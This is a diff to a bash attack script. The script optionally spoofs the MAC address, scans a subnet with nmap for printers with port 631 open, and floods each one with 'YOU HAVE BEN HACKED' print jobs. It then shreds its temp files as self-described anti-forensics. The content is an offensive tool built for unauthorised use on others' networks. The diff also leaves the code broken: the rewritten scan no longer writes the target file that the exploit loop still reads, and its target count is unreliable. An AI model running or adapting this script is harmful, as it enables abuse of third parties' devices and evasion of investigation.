@@ -1,5 +1,4 @@
 #!/bin/bash
-#By: DeadRebel
 spoof(){
     ifconfig eth0 down;
     ifconfig eth0 hw ether $mcfodeo;
@@ -7,16 +6,17 @@ spoof(){
     sleep 1; 
 } 
 scan(){
-    YO=$(cat /etc/resolv.conf | grep nameserver | cut -d ' ' -f 2)
-    nmap -p 631 $YO/24 | grep open -B 3 | grep report | cut -d ' ' -f 5 | tr ' ' '\n' > tempT;
-    TOTAL=$(wc -l tempT | cut -f 1 -d ' ' )
+    echo "[*] Scanning $1"
+    NET=$(cat /etc/resolv.conf | grep nameserver | cut -d ' ' -f 2)
+    TARGETS=`nmap -p 631 $1 | grep open -B 3 | grep report | cut -d ' ' -f 5 | tr ' ' '\n'`
+    TOTAL=$( echo $TARGETS | wc -l | cut -f 1 -d ' ' )
 }
 exploit(){
     figlet "YOU HAVE BEN HACKED" > temp;
     for (( l=0; l < $pages; l++ )) ; do
 	    for i in $(cat tempT); do
 		    lp -h $i:631 temp 
-		    sleep 2 #To protect the printer buffer, or just sleep, u know, scripts need this. 
+		    sleep 2 
 	    done
     done
 }
@@ -25,14 +25,23 @@ forensic(){
     shred -z  tempT;
     rm -f temp tempT;
 }
+usage(){
+	echo "[!] Error, please check this help"
+	echo "		$0 network/mask"
+	echo "		Example: $0 10.0.0.0/24"
+
+}
+### MAIN 
 if [ $(id -u ) != 0 ];then
 	echo "You need to run with root";
-	exit;
+	exit 1
+elif [ $# -lt 1 ];then
+	usage
+	exit 1
 fi
 echo "Alright, lets do that shit";
-echo "[*] Want Spoof your mac?[y/n]"
-read spof
-if [ $spof = 'y' ];then
+read -p "[*] Want Spoof your mac?[y/n]"
+if [ $REPLY = 'y' ];then
 	echo "Give to me the MAC you want:";
 	echo "Blank for default:(53:F0:D3:07:10:00)";
 	read mcfodeo
@@ -42,22 +51,24 @@ if [ $spof = 'y' ];then
 	echo "[*] Spoofing";
 	spoof
 	echo "[*] Done";
-else echo "Really bad Ass uh";
 fi
 echo "[*] Searching for targets";
-scan
-echo "[*] Number of Targets found: $TOTAL";
-echo "[+] Exploit?[y/n]";
-read opt
-if [ $opt = 'y' ];then 
-    echo "How Many pages for printer:";
-    read pages;
-    echo "[*] Exploiting";
-    exploit
-    echo "[*] Done";
-    echo "[*] Starting Anti-Forensics";
-    forensic
-    echo "[*] Done";
-    echo "[*] Enjoy, bye";
+scan $1
+if [ $TOTAL -eq 1 ];then
+	echo "[!] No targets found"
+	exit 1
+else
+	echo "[*] Number of Targets found: $TOTAL";
+	read -p "[+] Exploit?[y/n]";
+	if [ $REPLY = 'y' ];then 
+	    echo "How Many pages for printer:";
+	    read pages;
+	    echo "[*] Exploiting";
+	    exploit
+	    echo "[*] Done";
+	    echo "[*] Starting Anti-Forensics";
+	    forensic
+	    echo "[*] Done";
+	    echo "[*] Enjoy, bye";
+	fi
 fi
-
